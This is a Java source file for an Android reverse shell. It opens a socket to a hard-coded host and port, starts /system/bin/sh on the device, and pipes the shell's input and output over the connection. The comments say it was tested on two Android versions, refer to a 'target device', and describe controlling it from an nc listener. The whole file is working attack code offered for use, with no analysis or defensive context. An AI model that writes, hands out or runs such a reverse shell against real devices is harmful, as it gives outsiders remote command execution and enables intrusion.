import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.net.InetSocketAddress;

/*
 * Note that this shell does not close itself when you close your `nc` by CTRL+C or something.
 * You should enter `exit` as last command in the reverse shell to close the process on remote end.
 *
 * Tested on Android 8 (API 26), Android 5.1 (API 22)
 *
 **/


public class AndroidReverseShell {

  // change these to values to your liking
  private final static String HOST = "192.168.1.100";
  private final static int PORT = 1337;

  // `sh` should be on this path but verify on your target device
  private final static String SH_PATH = "/system/bin/sh"; 
  private static Socket sock = null;

  public static void main(String[] args) {
    System.out.println("Attepting to connect to " + HOST + ":" + PORT);
    try {
      sock = new Socket();
      sock.connect(new InetSocketAddress(HOST, PORT), 1000);
    } catch (IOException e) {
      System.out.println("Failed to create socket: " + e);
      return;
    }
    System.out.println("Connected to " + HOST + ":" + PORT);

    executeShell();

    if (sock != null && sock.isClosed()) {
      try {
        sock.close();
      } catch (IOException e) {
        // don't care
      }
    }
  }


  // rewritten from https://gist.github.com/caseydunham/53eb8503efad39b83633961f12441af0
  public static void executeShell() {
    Process shell;
    try {
      shell = new ProcessBuilder(SH_PATH).redirectErrorStream(true).start(); 
    } catch (IOException e) {
      System.out.println("Failed to start \"" + SH_PATH  + "\": " + e);
      return;
    }

    InputStream pis, pes, sis;
    OutputStream pos, sos;

    try {
      pis = shell.getInputStream();
      pes = shell.getErrorStream();
      sis = sock.getInputStream();
      pos = shell.getOutputStream();
      sos = sock.getOutputStream();
    } catch (IOException e) {
      System.out.println("Failed to obtain streams: " + e);
      shell.destroy();
      return;
    }

    while ( !sock.isClosed()) {
      try {
        while (pis.available() > 0) {
          sos.write(pis.read());
        }

        while (pes.available() > 0) {
          sos.write(pes.read());
        }

        while (sis.available() > 0) {
          pos.write(sis.read());
        }

        sos.flush();
        pos.flush();
      } catch (IOException e) {
        System.out.println("Stream error: " + e);
        shell.destroy();
      }

      try {
        Thread.sleep(50);
      } catch (InterruptedException e) {
        // don't care
      }
      
      try {
        shell.exitValue();
        break;
      } catch (IllegalThreadStateException e) {
        // shell process is still running, can't get exit value
      }
    }

    System.out.println("Socket is not connected, exiting.");
    shell.destroy();
  }
}
